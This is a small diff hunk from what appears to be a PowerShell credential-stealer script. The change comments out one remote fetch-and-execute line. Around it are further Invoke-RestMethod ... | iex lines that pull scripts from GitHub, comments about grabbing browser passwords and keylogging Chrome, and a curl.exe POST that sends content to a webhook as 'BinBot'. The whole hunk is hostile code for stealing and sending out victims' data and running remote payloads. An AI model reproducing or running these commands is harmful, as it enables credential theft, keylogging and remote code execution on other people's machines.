@@ -342,7 +342,7 @@ curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\
 # Grab pass browserpassview
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/WbGrab.ps1 | iex
 # keylogchrome
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
+# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/Nitro4542/getjumpscared/main/scripts/downloader.ps1 | iex
 Sleep 10
